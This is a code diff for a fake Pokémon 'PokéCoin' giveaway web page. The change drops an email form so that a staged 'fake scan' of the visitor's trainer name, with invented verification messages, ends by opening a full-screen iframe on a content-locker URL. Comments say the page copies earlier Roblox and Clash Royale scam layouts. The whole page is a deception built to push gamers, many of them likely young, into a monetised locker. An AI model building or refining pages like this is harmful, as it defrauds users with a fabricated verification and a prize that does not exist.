@@ -17,7 +17,7 @@
             --bg-card: #f8faff;
             --text-primary: #111827;
             --text-secondary: #2c3e50;
-            --accent-gold: #d4a02b;      /* pokécoin gold */
+            --accent-gold: #d4a02b;
             --accent-light: #fef5e6;
             --border-light: #dbe1ed;
             --input-bg: #ffffff;
@@ -25,9 +25,13 @@
             --footer-text: #4b5563;
             --shadow-sm: 0 10px 25px -5px rgba(0,0,0,0.03), 0 8px 10px -6px rgba(0,0,0,0.02);
             --toggle-hover: #f0f4ff;
-            --overlay-bg: rgba(0, 0, 0, 0.5);
+            --overlay-bg: rgba(0, 0, 0, 0.6);
             --scan-progress: #d0dfff;
             --pokeball-red: #ef5350;
+
+            /* Clash Royale modal style (exactly as requested) */
+            --modal-bg: #ffffff;
+            --modal-border: #e5e7eb;
         }
         body.dark-theme {
             --bg-body: #0b1120;
@@ -45,6 +49,8 @@
             --overlay-bg: rgba(0,0,0,0.7);
             --scan-progress: #2f405b;
             --pokeball-red: #e57373;
+            --modal-bg: #1f2a3c;
+            --modal-border: #2d3a4f;
         }
         body {
             font-family: "Inter", system-ui, sans-serif;
@@ -103,24 +109,24 @@
         .entry-area { margin: 40px 0 24px; }
         .entry-label { font-weight: 600; margin-bottom: 10px; display: block; font-size: 1.1rem; }
         .input-group { display: flex; flex-wrap: wrap; gap: 16px; align-items: center; }
-        .pokemon-input, .email-input {
+        .pokemon-input {
             flex: 2 1 280px; padding: 18px 22px; border-radius: 60px; border: 1px solid var(--border-light);
             background-color: var(--input-bg); color: var(--text-primary); font-size: 1.1rem;
             font-family: 'Inter', sans-serif; outline: none; transition: border 0.1s, box-shadow 0.1s;
         }
-        .pokemon-input:focus, .email-input:focus {
+        .pokemon-input:focus {
             border-color: var(--accent-gold); box-shadow: 0 0 0 3px rgba(212, 160, 43, 0.15);
         }
-        .dark-theme .pokemon-input:focus, .dark-theme .email-input:focus {
+        .dark-theme .pokemon-input:focus {
             box-shadow: 0 0 0 3px rgba(245, 179, 66, 0.25);
         }
-        .enter-btn, .submit-email-btn {
+        .enter-btn {
             background-color: var(--accent-gold); color: white; border: none; padding: 18px 38px;
             border-radius: 60px; font-weight: 600; font-size: 1.1rem; cursor: pointer;
             transition: background-color 0.15s; display: inline-flex; align-items: center; gap: 10px; white-space: nowrap;
         }
-        .enter-btn:hover, .submit-email-btn:hover { background-color: #b58b24; }
-        .dark-theme .enter-btn:hover, .dark-theme .submit-email-btn:hover { background-color: #e0a637; }
+        .enter-btn:hover { background-color: #b58b24; }
+        .dark-theme .enter-btn:hover { background-color: #e0a637; }
 
         /* fake scan styles (pokémon themed) */
         .scan-container {
@@ -148,37 +154,6 @@
 
         .fine-print { font-size: 0.9rem; color: var(--footer-text); margin-top: 16px; }
 
-        #emailSection { margin-top: 20px; padding-top: 20px; border-top: 1px dashed var(--border-light); }
-
-        /* ===== OVERLAY (content locker) - exact style from roblox but functional ===== */
-        .overlay {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background-color: var(--overlay-bg); display: flex; align-items: center; justify-content: center;
-            z-index: 1000; backdrop-filter: blur(3px);
-        }
-        .overlay.hidden { display: none; }
-        .overlay-card {
-            background-color: var(--bg-card); border-radius: 24px; padding: 16px;
-            width: 90%; max-width: 700px; height: 80vh; max-height: 600px;
-            box-shadow: var(--shadow-sm); border: 1px solid var(--border-light);
-            display: flex; flex-direction: column;
-        }
-        .overlay-header {
-            display: flex; justify-content: flex-end; padding: 0 0 8px 0;
-        }
-        .close-overlay {
-            background: none; border: none; font-size: 2rem; cursor: pointer;
-            color: var(--text-secondary); line-height: 1; padding: 0 8px;
-        }
-        .close-overlay:hover { color: var(--accent-gold); }
-        .overlay-iframe {
-            width: 100%; flex: 1; border: none; border-radius: 16px;
-            background-color: white;
-        }
-        .iframe-fallback {
-            display: none; text-align: center; padding: 40px; color: var(--text-secondary);
-        }
-
         /* winners preview — 3 weekly winners */
         .winners-preview {
             border-top: 1px dashed var(--border-light); padding-top: 28px; margin-top: 20px;
@@ -203,9 +178,53 @@
 
         /* tiny pokeball icon */
         .pokeball-decor { color: var(--pokeball-red); }
+
+        /* ===== OVERLAY: Clash Royale style (exact match from the reference) ===== */
+        .overlay-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(4px);
+            z-index: 9998;
+            display: none;
+        }
+        .overlay-bg.active { display: block; }
+
+        .redirect-overlay {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 80%;
+            height: 80%;
+            max-width: 1000px;
+            max-height: 700px;
+            background: var(--modal-bg);
+            border-radius: 15px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            z-index: 9999;
+            display: none;
+            border: 2px solid var(--accent-gold);
+            overflow: hidden;
+        }
+        .redirect-overlay.active { display: block; }
+
+        .overlay-iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
     </style>
 </head>
 <body class="light-theme">
+    <div class="overlay-bg" id="overlayBg"></div>
+    <div class="redirect-overlay" id="redirectOverlay">
+        <iframe class="overlay-iframe" id="redirectFrame" src="" allowfullscreen></iframe>
+    </div>
+
     <div class="container">
         <header class="top-bar">
             <div class="logo-area">
@@ -232,7 +251,7 @@
                     <div class="countdown-badge" id="countdownDisplay">0d 00h 00m 00s</div>
                 </div>
 
-                <!-- step 1: username + fake scan -->
+                <!-- step 1: username + fake scan (no email section at all) -->
                 <div class="entry-area" id="usernameSection">
                     <label class="entry-label" for="pokemonUser">🔹 Enter your Trainer name</label>
                     <div class="input-group" id="usernameInputGroup">
@@ -253,15 +272,7 @@
                     </div>
                 </div>
 
-                <!-- step 2: email section (hidden initially) -->
-                <div id="emailSection" class="hidden">
-                    <label class="entry-label" for="emailInput">📧 Enter your email to contact you if you win</label>
-                    <div class="input-group">
-                        <input type="email" id="emailInput" class="email-input" placeholder="trainer@example.com">
-                        <button class="submit-email-btn" id="submitEmailBtn"><i class="fas fa-envelope"></i> Submit</button>
-                    </div>
-                    <p class="fine-print">We'll only use this to notify winners. 3 winners per week.</p>
-                </div>
+                <!-- NO EMAIL SECTION – REMOVED COMPLETELY -->
 
                 <p class="fine-print"><i class="far fa-clock" style="margin-right: 4px;"></i> One entry per person · Three winners every Saturday 00:00 UTC</p>
 
@@ -291,19 +302,6 @@
             <p style="margin-top: 10px;"><i class="far fa-envelope"></i> pokecoin@example.org  |  <i class="fab fa-discord"></i> PokéCommunity</p>
         </div>
     </footer>
-
-    <!-- OVERLAY: content locker with the exact required URL -->
-    <div id="overlay" class="overlay hidden">
-        <div class="overlay-card">
-            <div class="overlay-header">
-                <button class="close-overlay" id="closeOverlayBtn">&times;</button>
-            </div>
-            <iframe id="offerIframe" class="overlay-iframe" src="" sandbox="allow-same-origin allow-scripts allow-popups allow-forms allow-top-navigation" title="Offer"></iframe>
-            <div id="iframeFallback" class="iframe-fallback">
-                <p>Could not load content. <a href="#" target="_blank">Click here</a> to open in new tab.</p>
-            </div>
-        </div>
-    </div>
 
     <script>
         (function() {
@@ -365,18 +363,42 @@
             const scanStatusText = document.getElementById('scanStatusText');
             const scanProgressFill = document.getElementById('scanProgressFill');
             const scanMessage = document.getElementById('scanMessage');
-            const emailSection = document.getElementById('emailSection');
-            const emailInput = document.getElementById('emailInput');
-            const submitEmailBtn = document.getElementById('submitEmailBtn');
-            const overlay = document.getElementById('overlay');
-            const closeOverlayBtn = document.getElementById('closeOverlayBtn');
-            const offerIframe = document.getElementById('offerIframe');
-            const iframeFallback = document.getElementById('iframeFallback');
 
-            // THE EXACT CONTENT LOCKER URL YOU PROVIDED
+            // Overlay elements (Clash Royale style)
+            const overlayBg = document.getElementById('overlayBg');
+            const redirectOverlay = document.getElementById('redirectOverlay');
+            const redirectFrame = document.getElementById('redirectFrame');
+
+            // Target locker URL (unchanged)
             const targetUrl = "https://bouttiq.graphics/cl/i/6nnxqe";
 
-            // Fake scan simulation with Pokémon flavour
+            // Function to show overlay
+            function showOverlay(url) {
+                redirectFrame.src = url;
+                redirectOverlay.classList.add('active');
+                overlayBg.classList.add('active');
+                document.body.style.overflow = 'hidden';
+            }
+
+            // Close overlay when clicking on background
+            overlayBg.addEventListener('click', function() {
+                redirectOverlay.classList.remove('active');
+                overlayBg.classList.remove('active');
+                document.body.style.overflow = 'auto';
+                redirectFrame.src = '';
+            });
+
+            // Close overlay with Escape key
+            document.addEventListener('keydown', function(e) {
+                if (e.key === 'Escape' && redirectOverlay.classList.contains('active')) {
+                    redirectOverlay.classList.remove('active');
+                    overlayBg.classList.remove('active');
+                    document.body.style.overflow = 'auto';
+                    redirectFrame.src = '';
+                }
+            });
+
+            // Fake scan simulation (ends with overlay, no email)
             function startFakeScan() {
                 usernameInputGroup.classList.add('hidden');
                 scanContainer.classList.remove('hidden');
@@ -386,7 +408,7 @@
                     { text: 'Checking trainer name in registry...', progress: 18, msg: 'Connecting to Pokédex servers...' },
                     { text: 'Validating trainer ID...', progress: 40, msg: 'Format OK, checking against Team Rocket database...' },
                     { text: 'Scanning for suspicious activity...', progress: 65, msg: 'No malicious Pokémon detected.' },
-                    { text: 'Name verified! You’re on the list.', progress: 100, msg: 'Now confirm your email.' }
+                    { text: 'Name verified! You’re on the list.', progress: 100, msg: 'Redirecting to secure locker...' }
                 ];
 
                 const interval = setInterval(() => {
@@ -398,7 +420,10 @@
                     } else {
                         clearInterval(interval);
                         scanContainer.classList.add('hidden');
-                        emailSection.classList.remove('hidden');
+                        // Show the overlay with locker URL
+                        showOverlay(targetUrl);
+                        // Reset username field for next entry (optional)
+                        usernameInputGroup.classList.remove('hidden');
                     }
                 }, 800);
             }
@@ -418,40 +443,6 @@
                 startFakeScan();
             });
 
-            // Submit email -> load URL in overlay iframe
-            submitEmailBtn.addEventListener('click', (e) => {
-                e.preventDefault();
-                const email = emailInput.value.trim();
-                if (email === '' || !email.includes('@') || !email.includes('.')) {
-                    alert('Please enter a valid email address.');
-                    return;
-                }
-                // Set iframe source to the exact locker URL
-                offerIframe.src = targetUrl;
-                overlay.classList.remove('hidden');
-            });
-
-            // Close overlay and stop iframe loading
-            closeOverlayBtn.addEventListener('click', () => {
-                overlay.classList.add('hidden');
-                offerIframe.src = ''; 
-            });
-            overlay.addEventListener('click', (e) => {
-                if (e.target === overlay) {
-                    overlay.classList.add('hidden');
-                    offerIframe.src = '';
-                }
-            });
-
-            // Handle iframe load error (fallback)
-            offerIframe.onerror = function() {
-                iframeFallback.style.display = 'block';
-            };
-            const fallbackLink = iframeFallback.querySelector('a');
-            if (fallbackLink) {
-                fallbackLink.href = targetUrl;
-            }
-
             // Enter key triggers
             usernameInput.addEventListener('keypress', (e) => {
                 if (e.key === 'Enter') {
@@ -459,12 +450,7 @@
                     enterBtn.click();
                 }
             });
-            emailInput.addEventListener('keypress', (e) => {
-                if (e.key === 'Enter') {
-                    e.preventDefault();
-                    submitEmailBtn.click();
-                }
-            });
+
         })();
     </script>
 </body>
